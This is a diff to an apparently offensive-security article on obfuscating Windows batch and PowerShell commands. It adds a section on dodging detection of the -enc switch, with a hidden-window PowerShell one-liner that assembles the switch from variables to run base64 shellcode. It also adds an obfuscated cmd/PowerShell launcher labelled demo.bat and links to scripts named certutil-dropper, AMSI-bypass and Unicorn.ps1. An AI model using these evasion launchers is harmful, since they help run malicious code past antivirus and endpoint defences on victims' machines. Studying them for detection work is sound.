@@ -152,7 +152,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />
 
-- String obfuscated (**test.bat**)<br />
+- String obfuscated (**undefined-vars.bat**)<br />
 
       @echo off
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
@@ -622,6 +622,24 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
+      [ circumventing -encodedcommand detection - Additional Methods for exec base64 shellcode ]
+      Since the powershell -enc method started to be used to execute base64 shellcode strings that it became
+      very targeted by security suites to flag alerts, In order to circumvent -enc parameter we decided to
+      use powershell commands and leverage set-variables with .value.toString() in order to piece together
+      our -enc command into the command line. This allows us to specify -enc without ever calling -enc which
+      would be hit by detection rules. [ ReL1k ]
+
+
+<br />
+
+- File **Unicorn.ps1** (base64 shellcode execution)
+
+      powershell -WiN hIdDEn -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
+
+![powershell obfuscation](http://i.cubeupload.com/VM5rc9.png)
+
+---
+
       [ BitsTransfer - Additional Methods for Remote Download ]
       Another way to download/execute remotelly our agent without using the powershell switch
       (Net.WebClient).DownloadFile method. This method also allow us to chose the download
@@ -944,6 +962,8 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br />
 
+- demo.bat
+
       DE-OBFUSCATED : cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $ENCODED-SHELLCODE-STRING
       OBFUSCATED    : @c^M%k8%.E"x"%!h% /%i0:~1,1% =P%i0:~12,1%^W%!h%rS%i0:~6,1%%!h%l^L"."%!h%Xe '-'%U7%op "-"wI%U7%%k8% H%i0:~7,1%%k8%'D'%!h%N '-'%!h%^X'e'%C By%i0:~13,1%A^s%i0:~16,1% "-"%U7%O^n%i0:~7,1% "-"%!h%NC $ENCODED-SHELLCODE-STRING
 
@@ -952,7 +972,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 
 - Scripts used in this article (**demo**):<br />
-[1] [undefined-vars.bat](https://pastebin.com/MV0uxDaf) [2] [certutil-dropper.bat](https://pastebin.com/hyBJHAgx) [3] [demo.bat](https://pastebin.com/vnNELqd4) [4] [Hello.ps1](https://pastebin.com/ELByB5y7) [5] [Invoke-WebRequest.ps1](https://pastebin.com/9VRtFZ1Y) [6] [AMSI-bypass.bat](https://pastebin.com/H2kjLCin)<br />
+[1] [undefined-vars.bat](https://pastebin.com/MV0uxDaf) [2] [certutil-dropper.bat](https://pastebin.com/hyBJHAgx) [3] [Hello.ps1](https://pastebin.com/ELByB5y7) [4] [Unicorn.ps1](https://pastebin.com/y9qJdGJf) [5] [Invoke-WebRequest.ps1](https://pastebin.com/9VRtFZ1Y) [6] [AMSI-bypass.bat](https://pastebin.com/H2kjLCin)<br />
 
 ---
 
@@ -995,7 +1015,7 @@ Here we can view the all process of encoding/decoding in powershell console
 ---
 
 ### Special thanks
-**@danielbohannon** **@AndyGreen** **@enigma0x3**<br />
+**@danielbohannon** **@AndyGreen** **@enigma0x3** **ReL1k**<br />
 **@daniel sauder (avet)** **@Wandoelmo Silva** and<br />
 **@Muhammad Samaak <-- for is contributions to this project ^_^**<br />
 **@Shanty Damayanti <-- My geek wife for all the misspelling fixes <3**<br />
@@ -1011,6 +1031,7 @@ Here we can view the all process of encoding/decoding in powershell console
 [5] [danielbohannon - powershell-execution-argument-obfuscation](http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier)<br />
 [6] [paloaltonetworks - pulling-back-the-curtains-on-encodedcommand-powershell](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)<br />
 [7] [enigma0x3 - bypassing-amsi-via-com-server-hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/)<br />
+[8] [ReL1k - circumventing-encodedcommand-detection-powershell](https://www.trustedsec.com/2017/01/circumventing-encodedcommand-detection-powershell/)<br />
 
 <br />
 
